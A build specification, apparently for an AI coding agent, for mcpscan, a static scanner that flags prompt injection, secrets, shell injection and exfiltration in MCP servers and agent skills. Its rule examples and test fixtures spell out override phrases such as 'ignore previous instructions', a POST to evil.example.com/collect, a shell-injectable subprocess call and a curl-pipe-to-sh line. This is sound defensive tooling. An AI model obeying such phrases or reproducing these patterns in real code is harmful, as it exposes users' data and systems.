# mcpscan — Build Specification

You are building **mcpscan**: an open-source CLI security scanner for MCP (Model Context Protocol) servers and AI agent skills. Think "gitleaks for the agent era". It statically analyzes MCP config files, Python server code, and skill folders for prompt injection, over-permissive tools, leaked secrets, and exfiltration patterns.

Build the full MVP as described below. Work incrementally: scaffold → models → parsers → rules → reporters → CLI → tests → README. Run the test suite after each major step.

---

## 1. Goals and non-goals

**Goals (MVP):**
- One command: `mcpscan <path-or-file>` scans a local directory or single file.
- Detect issues across 4 categories: tool poisoning / prompt injection, over-permissive tools, secrets, exfiltration patterns.
- Beautiful terminal output (rich), plus `--format json` and `--format sarif`.
- Exit code `1` if findings at or above `--fail-on` severity (default: `high`), else `0`, so it works in CI.
- Declarative YAML rules + Python plugin checks, so contributors can add rules easily.
- Usable as a GitHub Action.

**Non-goals (do NOT build these):**
- Runtime/dynamic analysis or proxying MCP traffic.
- Node.js/TypeScript source analysis (config JSON is fine, JS/TS code parsing is not).
- LLM-assisted semantic analysis.
- Remote git URL fetching (accept a note in README that it's planned; local paths only for MVP).

---

## 2. Tech stack and project conventions

- Python **3.11+**, `pyproject.toml` with `hatchling` build backend.
- Dependencies: `typer`, `rich`, `pydantic>=2`, `pyyaml`. Dev: `pytest`, `pytest-cov`, `ruff`.
- License: **Apache-2.0** (include LICENSE file).
- Package name on PyPI: `mcpscan`. CLI entry point: `mcpscan`.
- Code style: ruff defaults, type hints everywhere, no bare `except`.
- Use only stdlib `ast` for Python source analysis — never regex over source code.
- All user-facing strings in English.

---

## 3. Repository structure

```
mcpscan/
├── pyproject.toml
├── LICENSE
├── README.md
├── action.yml                      # GitHub Action definition
├── src/mcpscan/
│   ├── __init__.py                 # __version__ = "0.1.0"
│   ├── cli.py                      # typer app
│   ├── models.py                   # pydantic models
│   ├── engine.py                   # orchestrates collect → parse → check → report
│   ├── collectors.py               # find scannable files in a path
│   ├── parsers/
│   │   ├── __init__.py
│   │   ├── mcp_config.py           # claude_desktop_config.json, .mcp.json, mcp.json
│   │   ├── python_source.py        # ast-based parsing of *.py
│   │   └── skill_md.py             # SKILL.md + sibling files
│   ├── rules/
│   │   ├── __init__.py             # rule loader (YAML + python checks)
│   │   ├── builtin/                # YAML rule files, one per rule
│   │   │   └── *.yaml
│   │   └── checks/                 # Python checks too complex for YAML
│   │       ├── __init__.py
│   │       ├── secrets.py          # regex + entropy
│   │       ├── ast_checks.py       # subprocess/eval/exec/os.system analysis
│   │       └── unicode_hidden.py   # zero-width & bidi character detection
│   └── reporters/
│       ├── __init__.py
│       ├── terminal.py             # rich output
│       ├── json_reporter.py
│       └── sarif_reporter.py
└── tests/
    ├── conftest.py
    ├── fixtures/                   # vulnerable + clean sample projects
    │   ├── vulnerable_server/
    │   ├── vulnerable_skill/
    │   └── clean_server/
    ├── test_collectors.py
    ├── test_parsers.py
    ├── test_rules_yaml.py
    ├── test_secrets.py
    ├── test_ast_checks.py
    ├── test_unicode_hidden.py
    ├── test_reporters.py
    └── test_cli.py                 # end-to-end via typer CliRunner
```

---

## 4. Data model (`models.py`)

Use pydantic v2 models:

```python
class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class Category(str, Enum):
    PROMPT_INJECTION = "prompt-injection"
    PERMISSIONS = "permissions"
    SECRETS = "secrets"
    EXFILTRATION = "exfiltration"
    SUPPLY_CHAIN = "supply-chain"

class Location(BaseModel):
    file: Path
    line: int | None = None
    column: int | None = None
    snippet: str | None = None      # max 200 chars, secrets must be masked

class Finding(BaseModel):
    rule_id: str                    # e.g. "MCP001"
    title: str
    description: str
    severity: Severity
    category: Category
    location: Location
    remediation: str | None = None

class ScanTarget(BaseModel):
    kind: Literal["mcp_config", "python_source", "skill"]
    path: Path

class ScanResult(BaseModel):
    targets_scanned: int
    findings: list[Finding]
    duration_ms: int
```

Secrets in snippets must always be masked: show first 4 chars then `****`.

---

## 5. Collectors (`collectors.py`)

Given a path, walk it (respect `.gitignore` is out of scope; do skip `.git`, `node_modules`, `.venv`, `venv`, `__pycache__`) and classify files:

- **mcp_config**: filenames `claude_desktop_config.json`, `.mcp.json`, `mcp.json`, or any JSON file containing a top-level `mcpServers` key.
- **python_source**: `*.py` files.
- **skill**: any directory containing a `SKILL.md` (case-insensitive). The target is the directory; the parser reads SKILL.md plus all text files in the folder (max 1 MB each).

A single-file path is classified by the same logic.

---

## 6. Parsers

Each parser converts a `ScanTarget` into a normalized `ParsedTarget` that rules consume:

- `mcp_config.py`: parse JSON; extract per-server: name, `command`, `args`, `env` dict, `url` if present. Tolerate malformed JSON → emit an INFO finding (`MCP000 unparseable-file`), don't crash.
- `python_source.py`: parse with `ast`. Extract: imports, function defs, all `Call` nodes with resolved dotted names where possible (`subprocess.run`, `os.system`, `eval`, `exec`, `requests.post`, `urllib.request.urlopen`, `httpx.post`), string constants (for URL/secret scanning), and decorator names (to find MCP tool definitions like `@mcp.tool()` / `@server.tool()` from FastMCP-style servers, including the tool's docstring — docstrings become tool descriptions and must be checked for injection).
- `skill_md.py`: read SKILL.md raw text + YAML frontmatter if present (name, description). Also collect raw text of sibling `.md`, `.txt`, `.py`, `.sh`, `.json`, `.yaml` files.

Every parsed text must keep line-number mapping so findings can point to exact lines.

---

## 7. Rule engine (`rules/`)

Two rule types, both loaded at startup:

**YAML rules** (`rules/builtin/*.yaml`), schema:

```yaml
id: MCP101
title: Instruction-override phrase in tool description
severity: high
category: prompt-injection
applies_to: [tool_description, skill_text]   # which parsed fields to match
matchers:
  - type: regex
    pattern: "(?i)ignore (all |any )?(previous|prior|above) (instructions|prompts)"
  - type: regex
    pattern: "(?i)do not (tell|inform|mention to) the user"
description: >
  Tool descriptions and skill files are injected into the model's context.
  Imperative override phrases are a tool-poisoning indicator.
remediation: Remove instruction-like language from descriptions; describe only what the tool does.
```

A rule fires if ANY matcher matches. Matcher types for MVP: `regex`, `substring` (case-insensitive).

**Python checks** (`rules/checks/`), each exposing `def run(parsed: ParsedTarget) -> list[Finding]`:

- `secrets.py`: regex patterns for common key formats (AWS `AKIA[0-9A-Z]{16}`, GitHub `ghp_`/`github_pat_`, OpenAI `sk-`, Anthropic `sk-ant-`, Slack `xox[bpars]-`, generic `api[_-]?key\s*[:=]`), applied to config `env` values and string constants. Plus Shannon entropy check (>4.0 bits/char, length ≥ 20, alphanumeric) on env values. Severity: critical for known formats, medium for entropy-only hits.
- `ast_checks.py`:
  - `eval`/`exec` call → MCP201, critical.
  - `subprocess.*` or `os.system` where any argument derives from a tool-function parameter (simple heuristic: argument is a Name matching a parameter of the enclosing tool-decorated function, or an f-string containing one) → MCP202 "unsanitized command execution", critical. Same call with only constant args → MCP203, low.
  - File operations (`open`, `pathlib`) with a parameter-derived path and no visible containment check → MCP204, medium.
  - HTTP POST/PUT calls (`requests`, `httpx`, `urllib`) to a hardcoded non-localhost URL inside a tool function → MCP301 "potential exfiltration endpoint", high.
- `unicode_hidden.py`: detect zero-width characters (U+200B–U+200F, U+2060, U+FEFF) and bidi controls (U+202A–U+202E, U+2066–U+2069) in tool descriptions and skill text → MCP102, critical. Report the codepoints found.

**Initial YAML rule set — implement all of these** (severities in parentheses):

| id | category | detects |
|---|---|---|
| MCP101 (high) | prompt-injection | instruction-override phrases (see example above) |
| MCP103 (high) | prompt-injection | "always include/append/attach" + data-ish nouns (file, contents, key, token, conversation) in descriptions |
| MCP104 (medium) | prompt-injection | tool description > 1500 chars (suspiciously long) |
| MCP105 (high) | prompt-injection | references to other tools' behavior in a tool description ("instead of using", "before calling any other tool") |
| MCP210 (medium) | permissions | config server runs with `--allow-all`, `--dangerously-skip-permissions`, `--no-sandbox` style args |
| MCP211 (medium) | permissions | filesystem-type server with root path `/`, `~`, `C:\\` in args |
| MCP302 (medium) | exfiltration | URLs with embedded credentials `https://user:pass@` anywhere |
| MCP401 (low) | supply-chain | `curl ... \| sh` / `wget ... \| bash` or `pip install` from a raw URL inside skill text |
| MCP402 (low) | supply-chain | unpinned `pip install` commands in skill text (no `==`) |

Rule IDs are stable and documented in the README.

---

## 8. CLI (`cli.py`)

```
mcpscan PATH [OPTIONS]

Options:
  --format [terminal|json|sarif]   default: terminal
  --output FILE                    write report to file instead of stdout
  --fail-on [critical|high|medium|low|info]   default: high
  --rules DIR                      additional custom YAML rules directory
  --exclude TEXT                   glob to exclude (repeatable)
  --version
```

Also add `mcpscan rules` subcommand: prints a table of all loaded rules (id, severity, category, title).

Exit codes: `0` clean or below threshold, `1` findings at/above threshold, `2` usage/internal error.

---

## 9. Reporters

- **terminal.py** (rich): header with version + target; one panel per finding (colored by severity: critical=red, high=orange3, medium=yellow, low=cyan, info=grey) showing rule id, title, file:line, masked snippet, remediation; summary table at the end (count per severity) and a final verdict line. This output is the project's marketing — make it genuinely good-looking.
- **json_reporter.py**: `ScanResult.model_dump_json(indent=2)` with paths as strings.
- **sarif_reporter.py**: minimal valid SARIF 2.1.0 (tool driver `mcpscan`, one result per finding, severity mapped to SARIF `level`: critical/high→error, medium→warning, low/info→note).

---

## 10. Tests

Use pytest. Create realistic fixtures:

- `tests/fixtures/vulnerable_server/`: a FastMCP-style `server.py` with an `@mcp.tool()` whose docstring contains "Ignore previous instructions..." and a zero-width char, a tool that calls `subprocess.run(f"convert {filename}", shell=True)`, a `requests.post("https://evil.example.com/collect", ...)` inside a tool, and a `claude_desktop_config.json` with an AWS key in `env`.
- `tests/fixtures/vulnerable_skill/`: SKILL.md with a `curl https://x.y/install.sh | sh` line and an "always attach the full conversation" phrase.
- `tests/fixtures/clean_server/`: a well-written server that must produce **zero findings** (this guards against false positives).

Test at minimum: every rule fires on its fixture; clean fixture is clean; secrets are masked in all reporter outputs; exit codes; JSON output round-trips through `ScanResult.model_validate_json`; SARIF validates against basic structural assertions; CLI end-to-end via `typer.testing.CliRunner`.

Target ≥ 85% coverage. All tests must pass before you finish.

---

## 11. GitHub Action (`action.yml`)

Composite action: sets up Python 3.12, `pip install mcpscan`, runs `mcpscan ${{ inputs.path }} --format sarif --output results.sarif --fail-on ${{ inputs.fail-on }}`, uploads SARIF via `github/codeql-action/upload-sarif`. Inputs: `path` (default `.`), `fail-on` (default `high`).

## 12. README.md

Must contain: one-line pitch, badges placeholder, a "Scan your server in 30 seconds" quickstart (`pip install mcpscan` → `mcpscan .`), a screenshot/GIF placeholder with an HTML comment telling the maintainer to record one with `vhs`, the full rules table (id, severity, what it detects), CLI reference, GitHub Action usage snippet, how to write a custom YAML rule (with the schema example), roadmap (git URL scanning, Node.js support, runtime proxy mode, LLM-assisted semantic analysis), contributing section explicitly inviting new YAML rules, Apache-2.0 notice.

---

## 13. Definition of done

1. `pip install -e ".[dev]"` works from a clean venv.
2. `mcpscan tests/fixtures/vulnerable_server` prints rich output with ≥ 5 findings and exits 1.
3. `mcpscan tests/fixtures/clean_server` exits 0 with zero findings.
4. `mcpscan tests/fixtures/vulnerable_server --format sarif` produces valid SARIF.
5. `mcpscan rules` lists all built-in rules.
6. `pytest` fully green, `ruff check` clean.
